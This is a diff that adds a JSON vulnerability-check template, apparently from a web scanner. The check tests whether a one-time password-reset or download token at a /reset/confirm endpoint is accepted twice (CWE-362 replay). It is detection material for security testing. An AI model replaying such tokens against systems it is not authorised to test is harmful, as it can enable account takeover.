@@ -1,0 +1,43 @@
+{
+  "name": "web/Single-use token reusable on replay",
+  "description": "[high] Proves missing single-use enforcement: a one-time recovery/download token is accepted TWICE (serial replay) = TOCTOU/amount-of-uses defect (CWE-362); true parallel races need the platform's burst executor, this is the deterministic core. Keywords: race condition toctou single use token replay reuse recovery. ctrl: consumed token 400s on second use -> not falsified. base_url = token-confirmation endpoint.",
+  "cwe": "CWE-362",
+  "requests": {
+    "payload": {
+      "method": "POST",
+      "url": "{{base_url}}/reset/confirm",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      "body": "token=c7tok123"
+    },
+    "replay": {
+      "method": "POST",
+      "url": "{{base_url}}/reset/confirm",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      "body": "token=c7tok123"
+    }
+  },
+  "conditions": [
+    {
+      "type": "status",
+      "request": "payload",
+      "equals": 200
+    },
+    {
+      "type": "status",
+      "request": "replay",
+      "equals": 200
+    }
+  ],
+  "params": [
+    "base_url"
+  ],
+  "source": "imported",
+  "successes": 1,
+  "id": "d624c2a1d08c",
+  "created": "2026-11-06T04:51:35.422905+00:00",
+  "last_used": "2026-11-06T04:51:35.422905+00:00"
+}
